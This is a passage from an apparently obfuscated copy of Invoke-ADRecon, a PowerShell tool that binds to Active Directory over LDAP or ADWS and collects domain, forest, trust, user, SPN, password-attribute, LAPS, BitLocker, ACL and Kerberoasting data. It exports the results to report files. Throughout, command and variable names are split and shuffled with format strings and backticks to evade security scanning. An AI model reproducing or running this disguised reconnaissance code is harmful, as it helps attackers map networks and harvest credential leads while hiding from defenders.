                    (  (Gci  ('vARI'+'aB'+'le:Y'+'VU'+'mk')).VaLuE::("{1}{2}{3}{4}{0}"-f 'alName','Load','W','i','thParti').Invoke(("{2}{0}{1}" -f 'ystem.XM','L','S')))."loC`AT`iOn"
                )) -Language ("{1}{3}{0}{2}" -f 'on','CShar','3','pVersi')
            }
        }

        If (${meT`h`Od} -eq ("{0}{1}"-f'LDA','P'))
        {
            If (${c`Lr} -eq "4")
            {
                &("{1}{0}{2}"-f'd','Ad','-Type') -TypeDefinition $(${LDaP`SO`URCe}+${pI`Ng`CAs`TlE`SMBscAnN`ErSoU`Rce}) -ReferencedAssemblies ([System.String[]]@(
                    ( (  gCi ('Var'+'IabLE:y'+'VUmk') ).VaLuE::("{0}{1}{3}{2}"-f 'LoadW','ithPartia','me','lNa').Invoke(("{0}{4}{3}{2}{5}{1}{6}"-f 'S','orySer','Direc','m.','yste','t','vices')))."lo`Ca`TioN"
                    (  $yVUmk::("{2}{1}{0}{3}"-f'lNam','dWithPartia','Loa','e').Invoke(("{1}{0}{2}" -f 'ystem','S','.XML')))."L`OcAtI`on"
                ))
            }
            Else
            {
                &("{1}{0}" -f 'pe','Add-Ty') -TypeDefinition $(${LDAP`s`OURCe}+${PinGCa`st`LEs`mb`S`CANN`E`Rsou`RcE}) -ReferencedAssemblies ([System.String[]]@(
                    (  ( ChIlditem ("Va"+"riaBl"+"E:Y"+"vuMK")  ).ValUE::("{0}{1}{5}{4}{2}{3}"-f'Load','W','rtialN','ame','thPa','i').Invoke(("{0}{3}{6}{2}{4}{7}{1}{5}" -f 'Syst','e','ryS','em.Di','er','s','recto','vic')))."lOCAt`I`ON"
                    (  ( iTEM  variABLE:YVUmk  ).vaLuE::("{1}{2}{3}{0}{4}"-f'tialNam','Load','Wit','hPar','e').Invoke(("{1}{2}{0}" -f 'ML','Syste','m.X')))."lOca`T`Ion"
                )) -Language ("{1}{2}{0}"-f'sion3','CSharp','Ver')
            }
        }
    }
    Catch
    {
        &("{2}{3}{1}{0}"-f '-Output','e','Wr','it') "[Invoke-ADRecon] $($_.Exception.Message) "
        Return ${nU`LL}
    }
    If (${sA`VEDe`B`U`GprEFerE`N`CE})
    {
        ${sCr`Ipt`:d`EBuGp`R`eFerEN`cE} = ${SAV`eD`eb`Ugpr`EFeRencE}
        &("{0}{1}{3}{2}"-f 'Remov','e-Va','iable','r') ("{0}{2}{1}{3}"-f'Sav','bugPreferen','eDe','ce')
    }

    
    
    If ((${mETh`OD} -eq ("{1}{0}" -f 'AP','LD')) -and (${Us`EaltcR`EdS}) -and (${dOMai`N`CoN`TrOl`LEr} -eq "") -and (${C`RE`De`NtiaL} -eq   $Nk5P::"EmP`TY"))
    {
        Try
        {
            ${o`Bj`dOMA`iN} = [ADSI]""
            If(!(${Ob`JDom`AIn}."N`Ame"))
            {
                &("{1}{3}{0}{2}" -f 'bos','Write','e','-Ver') ("{5}{3}{0}{7}{9}{2}{11}{10}{4}{8}{6}{1}"-f'ADRecon','Unsuccessful','S Che','Invoke-',' b','[','nd ','] R','i','UNA','DAP','ck, L')
            }
            ${U`sE`A`LtcReDS} = ${F`A`LSE}
            ${O`BjDOMa`in}.("{0}{1}"-f'Di','spose').Invoke()
        }
        Catch
        {
            ${u`se`AlTcR`EDS} = ${tR`UE}
        }
    }

    If (${u`sEA`L`TcrEdS} -and ((${dOmA`iNcO`NtrOlL`ER} -eq "") -or (${CR`e`denTIAl} -eq  ( GET-VariabLE Nk5p -VA)::"Em`ptY")))
    {

        If ((${d`O`mAInc`on`TROLLER} -ne "") -and (${CRe`dEnT`I`AL} -eq   ( cHIldITEm ('v'+'ariabLE:N'+'k5p') ).VAluE::"Emp`Ty"))
        {
            Try
            {
                ${CRE`DEnt`IAl} = &("{3}{0}{2}{1}"-f'ed','tial','en','Get-Cr')
            }
            Catch
            {
                &("{1}{0}{2}{3}" -f't','Write-Ou','p','ut') "[Invoke-ADRecon] $($_.Exception.Message) "
                Return ${N`UlL}
            }
        }
        Else
        {
            &("{3}{0}{2}{1}" -f'e','tput','-Ou','Writ') ((("{0}{6}{4}{5}{3}{2}{15}{12}{1}{7}{8}{10}{13}{11}{9}{14}"-f'R','1','Re','}AD','n Get-Help .{','0','u',' -Examp','les for additiona','at','l in','orm','s','f','ion.','con.p')) -f  [Char]92)
            &("{1}{2}{0}" -f 'ut','Writ','e-Outp') ("{2}{3}{9}{5}{6}{1}{4}{10}{0}{8}{7}" -f' p','er and -Cre','[I','nvoke-ADRecon','dentia','Use the -D','omainControll','eter.','aram','] ','l')('
')
            Return ${nU`LL}
        }
    }

    &("{1}{2}{0}"-f 'put','Writ','e-Out') ('[*]'+' '+'Run'+'ning'+' '+'on'+' '+"$RanonComputer")

    Switch (${cOLLE`CT})
    {
        ("{1}{0}" -f 'st','Fore') { ${A`DRFoR`E`sT} = ${t`Rue} }
        ("{0}{1}" -f 'Doma','in') {${A`DrD`OMaiN} = ${T`Rue} }
        ("{1}{0}" -f'usts','Tr') { ${ad`R`TRusT} = ${tR`UE} }
        ("{1}{0}" -f 's','Site') { ${adRsI`Te} = ${T`Rue} }
        ("{1}{0}{2}"-f'bn','Su','ets') { ${AdrsU`Bn`Et} = ${t`RuE} }
        ("{3}{2}{0}{4}{1}" -f'maHi','tory','che','S','s') { ${a`dRSchemAh`ISt`oRy} = ${tR`UE} }
        ("{3}{2}{0}{1}" -f'sswor','dPolicy','a','P') { ${Ad`R`PassW`oRD`pOlicy} = ${Tr`UE} }
        ("{3}{0}{1}{4}{5}{2}{6}" -f 'i','neGrainedPa','li','F','ss','wordPo','cy') { ${ADRFINE`GraiN`E`DpA`s`SWorDpoL`ICy} = ${t`RuE} }
        ("{3}{2}{0}{1}" -f 'l','lers','ontro','DomainC') { ${Adr`d`OMA`iNC`oNtrol`lerS} = ${TR`Ue} }
        ("{0}{1}"-f 'User','s') { ${a`Dr`UsERS} = ${Tr`UE} }
        ("{0}{1}{2}" -f'Use','rSP','Ns') { ${adr`USe`Rsp`Ns} = ${tr`Ue} }
        ("{1}{5}{3}{0}{4}{2}" -f 'Attri','Pass','es','ord','but','w') { ${a`DR`pa`SSw`OrdatTrIBuTeS} = ${t`Rue} }
        ("{0}{1}" -f'G','roups') {${adr`g`R`OuPS} = ${t`RUE} }
        ("{1}{0}{2}" -f 'roupC','G','hanges') { ${aDr`GrOup`CHAn`geS} = ${tR`Ue} }
        ("{3}{2}{1}{0}"-f 'rs','be','em','GroupM') { ${a`dRgRouP`MeMB`ErS} = ${t`Rue} }
        'OUs' { ${Ad`R`OuS} = ${T`Rue} }
        ("{0}{1}"-f'GP','Os') { ${a`dRgp`OS} = ${t`Rue} }
        ("{0}{1}"-f 'gP','Links') { ${ADRGPL`i`NKs} = ${t`RUe} }
        ("{0}{2}{1}"-f 'DNSZ','es','on') { ${ADRdn`sz`ones} = ${tr`Ue} }
        ("{2}{0}{1}" -f 'Record','s','DNS') { ${ADRD`NsR`e`Co`RdS} = ${TR`Ue} }
        ("{2}{0}{1}"-f'te','rs','Prin') { ${ADr`P`Rin`TErS} = ${tR`Ue} }
        ("{1}{0}{2}"-f'u','Comp','ters') { ${A`drCOMP`UT`ErS} = ${t`Rue} }
        ("{0}{1}{3}{2}"-f 'C','ompu','s','terSPN') { ${aDr`c`OmPUT`eRSp`Ns} = ${tR`UE} }
        ("{0}{1}"-f'L','APS') { ${a`dRla`Ps} = ${t`RUe} }
        ("{2}{0}{1}"-f 'cke','r','BitLo') { ${AdrBitL`oC`Ker} = ${tR`UE} }
        ("{1}{0}"-f'Ls','AC') { ${aD`R`ACLS} = ${T`RUE} }
        ("{0}{1}" -f'GPO','Report')
        {
            ${a`dr`gpO`RePo`Rt} = ${Tr`Ue}
            ${A`d`RCREaTE} = ${tr`UE}
        }
        ("{0}{2}{1}" -f'Ker','eroast','b') { ${A`drkErBe`R`oAsT} = ${t`RuE} }
        ("{6}{3}{4}{1}{7}{2}{5}{0}"-f'n','ts','rService','inAccou','n','Logo','Doma','usedfo') { ${aDRDomaIN`ACCOu`N`TSUseD`FOR`SErVICE`L`OGON} = ${TR`Ue} }
        ("{0}{1}"-f'D','efault')
        {
            ${AdRF`oRE`ST} = ${T`Rue}
            ${ADrdOm`A`In} = ${tR`UE}
            ${Ad`RTR`UST} = ${T`Rue}
            ${a`DRsI`Te} = ${TR`UE}
            ${a`DR`SUbneT} = ${Tr`Ue}
            ${A`dRsCHemaHi`sT`oRY} = ${t`RuE}
            ${A`d`RPaSSWo`RdpOL`icy} = ${T`RUE}
            ${AdRFInEgRAine`d`pasSWorD`PoL`Icy} = ${t`RUE}
            ${ADr`d`om`AIncO`Nt`Rol`lErs} = ${TR`UE}
            ${aD`RUsERS} = ${T`RUe}
            ${aDru`SeRS`P`NS} = ${tR`UE}
            ${aDr`pa`SSW`oR`DatTrIb`UtES} = ${Tr`Ue}
            ${adR`GrOU`Ps} = ${Tr`UE}
            ${AdR`Group`mEmb`E`Rs} = ${Tr`Ue}
            ${AD`RGr`ou`PCHanGeS} = ${t`RUE}
            ${AD`ROUs} = ${tR`Ue}
            ${aDr`Gp`oS} = ${t`RUe}
            ${ADr`gP`LinKs} = ${tr`Ue}
            ${a`drD`NsZON`es} = ${T`Rue}
            ${AdRDns`R`ECO`R`Ds} = ${t`RuE}
            ${a`drpriN`T`ErS} = ${tr`Ue}
            ${ADRComP`U`T`ERs} = ${Tr`Ue}
            ${adR`c`OmputEr`SPns} = ${tR`Ue}
            ${aDR`L`Aps} = ${T`RUe}
            ${Ad`Rbitlo`CkeR} = ${t`RuE}
            
            ${a`dRG`P`ORePoRt} = ${T`RUe}
            
            

            If (${o`U`TPUtT`YPE} -eq ("{2}{1}{0}" -f'ult','a','Def'))
            {
                [array] ${ou`T`PUTTYpE} = "CSV",("{1}{0}" -f 'l','Exce')
            }
        }
    }

    Switch (${ou`T`PUtt`YPE})
    {
        ("{0}{1}"-f 'ST','DOUT') { ${a`DRST`do`Ut} = ${T`RuE} }
        'CSV'
        {
            ${ad`Rc`sv} = ${tr`Ue}
            ${a`d`RCrEaTE} = ${t`RUe}
        }
        'XML'
        {
            ${AD`RXMl} = ${tr`UE}
            ${ad`Rcr`E`Ate} = ${t`RUE}
        }
        ("{1}{0}" -f 'N','JSO')
        {
            ${Ad`R`JsoN} = ${t`RUE}
            ${adR`cR`E`AtE} = ${Tr`UE}
        }
        ("{1}{0}"-f 'ML','HT')
        {
            ${a`DRht`mL} = ${t`RuE}
            ${AdRCr`e`ATe} = ${TR`Ue}
        }
        ("{1}{0}" -f 'cel','Ex')
        {
            ${Ad`RexCEL} = ${t`RUe}
            ${a`Drc`REAte} = ${TR`Ue}
        }
        'All'
        {
            
            ${a`dr`CSv} = ${Tr`Ue}
            ${A`Dr`XmL} = ${Tr`Ue}
            ${A`Drj`son} = ${t`RUe}
            ${aDr`Ht`ML} = ${tR`UE}
            ${aD`RExC`EL} = ${t`Rue}
            ${a`dr`c`ReAte} = ${t`RuE}
            [array] ${o`UtpUTty`pE} = "CSV","XML",("{1}{0}"-f'ON','JS'),("{0}{1}"-f 'HTM','L'),("{1}{0}" -f 'l','Exce')
        }
        ("{1}{0}"-f'lt','Defau')
        {
            [array] ${OU`T`PU`TTYPE} = {"{1}{0}"-f 'OUT','STD'}
            ${aDRSTd`o`Ut} = ${tR`Ue}
        }
    }

    If ( (${A`d`ReXcel}) -and (-Not ${Ad`Rc`sV}) )
    {
        ${A`D`RcsV} = ${T`Rue}
        [array] ${Out`p`U`TTYPe} += "CSV"
    }

    ${R`e`TUrNdiR} = &("{1}{2}{0}{3}" -f'cati','G','et-Lo','on')
    ${d`ATE} = &("{1}{0}{2}"-f't-D','Ge','ate')

    
    If ( (${adrouT`puT`DiR}) -and (${a`DRc`REATe}) )
    {
        If (!(&("{1}{0}"-f '-Path','Test') ${Ad`Rou`TPU`TDIr}))
        {
            &("{0}{1}{2}" -f'N','ew','-Item') ${a`d`Rou`TPUTdir} -type ("{2}{1}{0}"-f'ry','ecto','dir') | &("{0}{1}{2}"-f 'O','ut-Nul','l')
            If (!(&("{0}{2}{1}"-f 'Te','Path','st-') ${AdROUT`P`Utd`Ir}))
            {
                &("{1}{0}{3}{2}"-f'te-Out','Wri','ut','p') ("{8}{3}{4}{7}{2}{9}{5}{1}{0}{10}{6}" -f '. E','Dir Path ..','] Err','Invoke','-AD','r, invalid Output','ting','Recon','[','o','xi')
                Return ${N`ULL}
            }
        }
        ${aDR`O`UTPu`TdIR} = $((&("{0}{2}{1}{3}"-f'Co','vert-Pa','n','th') ${aDr`o`UTP`Ut`Dir}).("{1}{0}" -f 'mEnd','Tri').Invoke("\"))
        &("{3}{1}{0}{2}{4}" -f'Ver','e-','bo','Writ','se') ('[*]'+' '+'O'+'utput '+'Dire'+'c'+'tory: '+"$ADROutputDir")
    }
    ElseIf (${adRc`Re`AtE})
    {
        ${aDrOU`Tput`D`iR} =  -join(${rE`TurnD`IR},'\',("{2}{3}{1}{0}"-f't-','or','AD','Recon-Rep'),$(&("{0}{2}{1}" -f 'Get','Date','-') -UFormat ("{0}{1}{2}" -f '%Y','%','m%d%H%M%S')))
        &("{0}{1}{2}"-f'New-','I','tem') ${ADr`O`UtP`UTDir} -type ("{1}{0}{2}" -f 'r','di','ectory') | &("{0}{1}"-f 'Out-Nu','ll')
        If (!(&("{1}{2}{0}" -f'ath','Test','-P') ${a`drO`UtpU`TDir}))
        {
            &("{0}{1}{2}{3}" -f'Write-','Ou','tp','ut') ("{10}{5}{2}{8}{9}{1}{0}{7}{3}{11}{6}{4}" -f 'n] Error, co','eco','ke-','d not create ou','ry','nvo','directo','ul','A','DR','[I','tput ')
            Return ${N`ULL}
        }
        ${AdRO`U`TpuTd`Ir} = $((&("{2}{1}{0}"-f 'th','t-Pa','Conver') ${aDRouT`PUt`dir}).("{0}{1}"-f 'TrimEn','d').Invoke("\"))
        &("{4}{0}{3}{1}{2}"-f 'mo','iab','le','ve-Var','Re') ("{1}{2}{0}" -f 'ate','ADR','Cre')
    }
    Else
    {
        ${aDro`U`TpUTdIR} = ${ret`U`RnD`Ir}
    }

    If (${aD`RCSv})
    {
        ${cS`VPa`TH} = [System.IO.DirectoryInfo] -join(${ADROu`Tpu`T`DiR},'\',("{1}{0}{2}"-f 'i','CSV-F','les'))
        &("{1}{0}{2}" -f'w-Ite','Ne','m') ${CS`Vp`ATH} -type ("{1}{0}" -f 'irectory','d') | &("{1}{0}"-f'ull','Out-N')
        If (!(&("{2}{0}{1}"-f 'Pat','h','Test-') ${Cs`VpA`TH}))
        {
            &("{1}{3}{2}{0}" -f'ut','Wr','te-Outp','i') ("{7}{10}{6}{0}{2}{1}{4}{3}{5}{9}{8}"-f 'rror, ','d no','coul','ate outpu','t cre','t ','n] E','[Invoke-ADR','ctory','dire','eco')
            Return ${Nu`lL}
        }
        &("{4}{2}{1}{0}{3}"-f 'l','ab','ari','e','Remove-V') ("{0}{1}" -f 'AD','RCSV')
    }

    If (${A`dRxML})
    {
        ${xmL`path} = [System.IO.DirectoryInfo] -join(${A`dRO`UTP`UTdir},'\',("{1}{2}{3}{0}"-f 's','XML','-Fi','le'))
        &("{0}{1}"-f'New','-Item') ${Xmlpa`Th} -type ("{2}{0}{1}"-f'rect','ory','di') | &("{1}{0}{2}" -f '-Nul','Out','l')
        If (!(&("{0}{2}{1}" -f'Test-','h','Pat') ${XMlpA`TH}))
        {
            &("{1}{3}{0}{2}" -f 'ite-Ou','W','tput','r') ("{5}{6}{10}{7}{3}{9}{12}{4}{8}{11}{15}{0}{16}{2}{13}{17}{1}{14}" -f't ','rector','utp','] Error','oul','[Invok','e-AD','econ','d',', ','R',' ','c','ut d','y','no','create o','i')
            Return ${Nu`LL}
        }
        &("{0}{2}{1}{3}"-f'Remove-Va','l','riab','e') ("{1}{2}{0}"-f 'XML','A','DR')
    }

    If (${a`dR`jSoN})
    {
        ${J`S`on`PatH} = [System.IO.DirectoryInfo] -join(${a`dRouTP`UtdIr},'\',("{0}{1}{2}" -f 'JSO','N-Fi','les'))
        &("{0}{1}{2}"-f'N','e','w-Item') ${j`SON`PAtH} -type ("{1}{0}{2}"-f'i','d','rectory') | &("{1}{2}{0}"-f'l','Out-','Nul')
        If (!(&("{2}{1}{0}" -f'h','st-Pat','Te') ${J`SOn`paTH}))
        {
            &("{0}{1}{2}"-f 'Write-O','utp','ut') ("{12}{10}{3}{4}{7}{6}{13}{0}{1}{16}{2}{8}{11}{5}{9}{15}{14}" -f ' E','rror,','uld not cr','-ADR','ec','tp','n','o','ea','ut d','Invoke','te ou','[',']','y','irector',' co')
            Return ${n`UlL}
        }
        &("{4}{1}{3}{0}{2}"-f'ria','mo','ble','ve-Va','Re') ("{1}{0}{2}"-f 'JS','ADR','ON')
    }

    If (${ADrH`T`mL})
    {
        ${H`TmLPa`Th} = [System.IO.DirectoryInfo] -join(${A`dROu`TPu`Td`Ir},'\',("{2}{0}{1}"-f'ML','-Files','HT'))
        &("{0}{2}{1}"-f 'New-','tem','I') ${h`TMlpa`TH} -type ("{0}{3}{2}{1}"-f'd','ory','ct','ire') | &("{2}{1}{0}"-f 'Null','-','Out')
        If (!(&("{0}{1}{2}" -f'T','es','t-Path') ${ht`mLpa`Th}))
        {
            &("{0}{1}{3}{2}"-f 'W','rite','put','-Out') ("{0}{7}{5}{2}{11}{3}{12}{6}{4}{9}{1}{13}{8}{10}"-f '[Inv','out','DRecon] Error','ot c','t','A','ea','oke-','ut dire','e ','ctory',', could n','r','p')
            Return ${Nu`Ll}
        }
        &("{1}{3}{2}{0}"-f'le','Re','iab','move-Var') ("{1}{2}{0}"-f'TML','AD','RH')
    }

    
    If (${U`S`E`ALTcrEdS} -and (${mE`Th`oD} -eq ("{0}{1}" -f'AD','WS')))
    {
        If (!(&("{0}{3}{1}{2}"-f'Test-P','t','h','a') ("{0}{1}" -f 'A','DR:')))
        {
            Try
            {
                &("{1}{0}{2}" -f'PSDri','New-','ve') -PSProvider ("{2}{3}{0}{4}{1}" -f'D','tory','Activ','e','irec') -Name ("{0}{1}" -f 'A','DR') -Root "" -Server ${D`OmaIn`CONt`Rol`lER} -Credential ${CreD`EnTi`AL} -ErrorAction ("{1}{0}"-f 'op','St') | &("{1}{2}{0}"-f'l','Out-','Nul')
            }
            Catch
            {
                &("{2}{0}{1}" -f'u','tput','Write-O') "[Invoke-ADRecon] $($_.Exception.Message) "
                If (${ADRou`TPUt`d`Ir})
                {
                    &("{1}{4}{0}{3}{2}"-f 'ADR','Remove-Em','Dir','Output','pty') ${a`d`ROu`T`PUTdIR} ${oUtP`Ut`TYpe}
                }
                Return ${NU`LL}
            }
        }
        Else
        {
            &("{4}{3}{0}{2}{1}" -f'PSDr','ve','i','e-','Remov') ("{1}{0}" -f 'R','AD')
            Try
            {
                &("{1}{2}{0}"-f 've','New-PSDr','i') -PSProvider ("{1}{2}{0}" -f'tory','ActiveDire','c') -Name ("{0}{1}"-f'AD','R') -Root "" -Server ${dOm`AInc`o`NtrollER} -Credential ${CrEdEnt`i`AL} -ErrorAction ("{1}{0}" -f'op','St') | &("{1}{0}{2}"-f 'ut-N','O','ull')
            }
            Catch
            {
                &("{2}{0}{1}" -f't','e-Output','Wri') "[Invoke-ADRecon] $($_.Exception.Message) "
                If (${AdROuTp`UtD`ir})
                {
                    &("{1}{3}{2}{4}{0}{5}" -f 'tputDi','Re','-EmptyADRO','move','u','r') ${ADr`OuT`p`UtDIR} ${O`UtPUt`TYpE}
                }
                Return ${Nu`LL}
            }
        }
        &("{1}{2}{0}"-f 'n','S','et-Locatio') ("{1}{0}" -f':','ADR')
        &("{2}{0}{1}" -f'rite-Deb','ug','W') ("{2}{1}{3}{0}" -f 'ted','R PSDri','AD','ve Crea')
    }

    If (${m`e`THOd} -eq ("{1}{0}"-f'P','LDA'))
    {
        If (${USea`l`TcREdS})
        {
            Try
            {
                ${ObJ`d`Omain} = &("{0}{2}{1}"-f'Ne','ect','w-Obj') ("{7}{1}{0}{8}{2}{4}{3}{6}{9}{5}"-f'i','m.D','cto','Se','ry','toryEntry','rvices','Syste','re','.Direc') "LDAP://$($DomainController)", ${Cr`EdeNTI`Al}."U`se`RNAme",${c`REdEn`TIaL}.("{3}{0}{1}{2}"-f 'kCre','dent','ial','GetNetwor').Invoke()."PAsS`wo`Rd"
                ${OBj`dOm`AinRooTd`Se} = &("{2}{1}{0}"-f 'ct','-Obje','New') ("{6}{1}{4}{5}{3}{0}{2}" -f 'rvices.Directory','em.Di','Entry','ySe','re','ctor','Syst') "LDAP://$($DomainController)/RootDSE", ${C`RE`d`eNtIAl}."UseRN`AmE",${cr`e`DeNT`iAL}.("{3}{2}{1}{0}"-f 'ial','kCredent','twor','GetNe').Invoke()."p`Ass`wORD"
            }
            Catch
            {
                &("{2}{0}{1}{3}"-f'it','e-Ou','Wr','tput') "[Invoke-ADRecon] $($_.Exception.Message) "
                If (${a`drOUt`putDiR})
                {
                    &("{2}{1}{4}{0}{3}"-f 'ptyA','em','R','DROutputDir','ove-Em') ${aDRouT`p`U`TdiR} ${ou`TPu`TTypE}
                }
                Return ${n`ULl}
            }
            If(!(${oBjd`oMa`iN}."N`AME"))
            {
                &("{1}{2}{3}{0}" -f 'put','W','ri','te-Out') ("{6}{7}{8}{3}{4}{5}{2}{0}{1}"-f'U','nsuccessful','d ','e','c','on] LDAP bin','[Inv','o','ke-ADR')
                If (${adr`ouTp`UTdiR})
                {
                    &("{0}{1}{4}{3}{2}" -f'Remove-Empt','yAD','Dir','put','ROut') ${ADrouTpU`T`d`ir} ${o`UT`pUTtype}
                }
                Return ${nU`Ll}
            }
            Else
            {
                &("{3}{1}{0}{2}" -f '-','ite','Output','Wr') ("{2}{4}{3}{0}{5}{1}" -f'in','ccessful','[*]','P b',' LDA','d Su')
            }
        }
        Else
        {
            ${OBJdoM`A`In} = [ADSI]""
            ${ObjDO`m`AIN`RoO`T`dSe} = ([ADSI] ("{0}{1}{2}" -f 'LDAP://R','ootD','SE'))
            If(!(${Ob`jD`OmAiN}."nA`ME"))
            {
                &("{1}{0}{3}{2}"-f 'e','Writ','utput','-O') ("{0}{5}{6}{1}{3}{4}{2}"-f'[Invoke-AD','DAP bind','ul',' Unsuccess','f','Reco','n] L')
                If (${A`DRO`UTPUT`DIR})
                {
                    &("{3}{0}{4}{2}{5}{1}"-f 'move-E','Dir','ROutpu','Re','mptyAD','t') ${ADrou`TPu`TDIr} ${O`UtpuT`T`Ype}
                }
                Return ${N`Ull}
            }
        }
        &("{1}{2}{3}{0}" -f '-Debug','Wr','it','e') ("{0}{3}{1}{2}" -f'LDAP Bing Suc','essf','ul','c')
    }

    &("{2}{1}{0}" -f 'put','te-Out','Wri') ('['+'*] '+'Com'+'menci'+'ng '+'- '+"$date")
    If (${ADrDo`m`A`in})
    {
        &("{0}{2}{1}" -f'W','-Output','rite') ("{1}{0}{2}"-f 'oma','[-] D','in')
        ${a`D`RoBje`CT} = &("{2}{0}{1}{3}"-f 't-ADRD','omai','Ge','n') -Method ${M`EtH`OD} -objDomain ${oB`JDO`mA`in} -objDomainRootDSE ${O`Bj`dOmAiNro`O`Td`sE} -DomainController ${dO`MAinCONT`RoL`LER} -Credential ${CREd`EN`TIAL}
        If (${a`drO`BJECT})
        {
            &("{0}{1}{2}"-f 'E','xport-AD','R') -ADRObj ${ad`R`ObJEct} -ADROutputDir ${A`D`RoUtpU`Tdir} -OutputType ${o`UtP`Uttype} -ADRModuleName ("{1}{0}"-f'omain','D')
            &("{3}{2}{0}{1}" -f'ab','le','e-Vari','Remov') ("{1}{0}{2}"-f 'Obje','ADR','ct')
        }
        &("{1}{0}{3}{2}" -f 'emo','R','iable','ve-Var') ("{2}{0}{1}" -f 'Domai','n','ADR')
    }
    If (${a`dr`FoRest})
    {
        &("{2}{0}{3}{1}" -f'rite-O','tput','W','u') ("{2}{3}{1}{0}" -f'st','re','[-]',' Fo')
        ${ADr`oBJ`Ect} = &("{0}{2}{3}{1}" -f 'Get-ADR','est','F','or') -Method ${meT`H`OD} -objDomain ${o`B`jd`OMaIn} -objDomainRootDSE ${O`BJdOm`A`iN`RoO`TDsE} -DomainController ${D`o`mAincON`TROlL`eR} -Credential ${crE`DE`N`TIAl}
        If (${Adro`B`jeCt})
        {
            &("{0}{1}{2}{3}" -f 'E','xp','ort','-ADR') -ADRObj ${a`DRoB`JECT} -ADROutputDir ${a`droU`TpuTDiR} -OutputType ${oUtPuT`TY`pE} -ADRModuleName ("{0}{1}{2}"-f'For','es','t')
            &("{4}{3}{0}{2}{1}"-f've','e','-Variabl','emo','R') ("{2}{0}{1}" -f 'ROb','ject','AD')
        }
        &("{1}{2}{0}" -f 'e','Remov','e-Variabl') ("{1}{2}{3}{0}"-f'st','ADRF','or','e')
    }
    If (${Adr`TR`Ust})
    {
        &("{2}{1}{0}{3}"-f'utpu','rite-O','W','t') ("{3}{0}{2}{1}"-f'T','sts','ru','[-] ')
        ${Adr`ObJ`E`ct} = &("{0}{2}{3}{1}"-f'Get','Trust','-A','DR') -Method ${M`eTh`oD} -objDomain ${oBjdoM`A`IN}
        If (${Ad`Rob`Ject})
        {
            &("{0}{3}{1}{2}" -f 'Exp','-AD','R','ort') -ADRObj ${aD`Ro`BJeCt} -ADROutputDir ${aDr`outp`Utd`Ir} -OutputType ${OU`TPut`TY`PE} -ADRModuleName ("{1}{0}{2}" -f'u','Tr','sts')
            &("{3}{2}{4}{1}{0}"-f'iable','-Var','v','Remo','e') ("{1}{2}{0}"-f 'ct','ADR','Obje')
        }
        &("{2}{1}{3}{0}"-f 'le','mov','Re','e-Variab') ("{2}{0}{1}"-f'RTru','st','AD')
    }
    If (${aD`R`SIte})
    {
        &("{0}{1}{3}{2}"-f'W','rit','utput','e-O') ("{2}{1}{0}"-f'es','it','[-] S')
        ${ADrOBj`E`CT} = &("{3}{0}{2}{1}" -f '-ADR','ite','S','Get') -Method ${ME`Th`oD} -objDomain ${oB`JdoMA`iN} -objDomainRootDSE ${Ob`JD`O`MAInR`OOtdse} -DomainController ${DOMaiN`coNt`R`Ol`leR} -Credential ${cre`DEn`Ti`Al}
        If (${ADRO`B`JEcT})
        {
            &("{3}{0}{2}{1}"-f 'xpo','-ADR','rt','E') -ADRObj ${adrO`BjE`ct} -ADROutputDir ${AD`ROUtpU`Td`IR} -OutputType ${O`UT`PUtTy`pe} -ADRModuleName ("{1}{0}" -f 'es','Sit')
            &("{3}{4}{2}{0}{1}" -f 'ia','ble','ar','Remove-','V') ("{2}{1}{0}" -f'bject','O','ADR')
        }
        &("{0}{1}{3}{2}"-f 'Rem','ove-Var','able','i') ("{1}{0}"-f'RSite','AD')
    }
    If (${a`dr`SubNet})
    {
        &("{2}{1}{0}{3}" -f'p','ut','Write-O','ut') ("{1}{0}{2}" -f '] Subne','[-','ts')
        ${AD`RobJ`ecT} = &("{0}{1}{2}" -f'Get-','ADRSubne','t') -Method ${M`E`THod} -objDomain ${OB`J`DoMAIn} -objDomainRootDSE ${oBJdOM`AI`Nroo`T`dSE} -DomainController ${Doma`in`cont`RoL`LEr} -Credential ${CreDE`NT`iAL}
        If (${ADroBJ`e`CT})
        {
            &("{1}{0}{2}" -f'ort-A','Exp','DR') -ADRObj ${AdR`o`BjeCT} -ADROutputDir ${aDRoUT`pUtd`iR} -OutputType ${OuT`PUT`Ty`Pe} -ADRModuleName ("{0}{1}{2}" -f 'S','ubn','ets')
            &("{0}{2}{1}{4}{3}" -f'Re','ve-Vari','mo','le','ab') ("{2}{0}{1}"-f'DR','Object','A')
        }
        &("{0}{3}{2}{1}"-f'Re','able','ri','move-Va') ("{0}{1}{2}"-f'AD','RSu','bnet')
    }
    If (${AD`Rsch`EmA`hIstORY})
    {
        &("{0}{2}{1}"-f'Write-O','tput','u') ("{2}{1}{4}{7}{0}{5}{8}{6}{3}" -f ' Ma','Hi','[-] Schema','ome time','s','y ','e s','tory -','tak')
        ${a`droBj`ecT} = &("{3}{2}{1}{4}{0}"-f 'tory','em','et-ADRSch','G','aHis') -Method ${mETH`Od} -objDomain ${ObJ`D`OM`AiN} -objDomainRootDSE ${OB`jDOm`Ai`NrOo`T`dse} -DomainController ${D`OmAi`NcoNtroLl`eR} -Credential ${creDe`Nt`IaL}
        If (${AdRo`BJE`ct})
        {
            &("{1}{2}{3}{0}" -f'DR','E','xpor','t-A') -ADRObj ${AdrO`Bj`eCt} -ADROutputDir ${ADROUt`PUTd`ir} -OutputType ${OuTp`UtTy`Pe} -ADRModuleName ("{1}{2}{0}"-f 'maHistory','Sc','he')
            &("{0}{2}{3}{1}"-f 'R','iable','emove-Va','r') ("{1}{2}{0}"-f'ject','ADRO','b')
        }
        &("{0}{1}{2}{3}" -f'Rem','ove-Vari','a','ble') ("{2}{3}{1}{4}{0}" -f'story','Schema','AD','R','Hi')
    }
    If (${AD`RPA`SS`worD`p`Olicy})
    {
        &("{0}{3}{1}{2}" -f'Writ','Out','put','e-') ("{4}{0}{1}{5}{3}{6}{2}"-f ' D','ef',' Policy','t Passw','[-]','aul','ord')
        ${AD`RO`BjecT} = &("{8}{6}{4}{3}{2}{0}{7}{5}{1}" -f'ord','cy','w','ss','tPa','li','ADRDefaul','Po','Get-') -Method ${m`etH`od} -objDomain ${o`Bj`domAiN}
        If (${adR`oB`jECT})
        {
            &("{1}{0}{2}"-f 'rt-A','Expo','DR') -ADRObj ${Ad`RO`BjE`CT} -ADROutputDir ${a`Drout`pUTDiR} -OutputType ${Ou`TPUt`TY`pe} -ADRModuleName ("{2}{0}{3}{1}"-f'ultPassword','licy','Defa','Po')
            &("{0}{1}{3}{2}" -f'Remov','e-','le','Variab') ("{1}{0}{2}" -f'Obje','ADR','ct')
        }
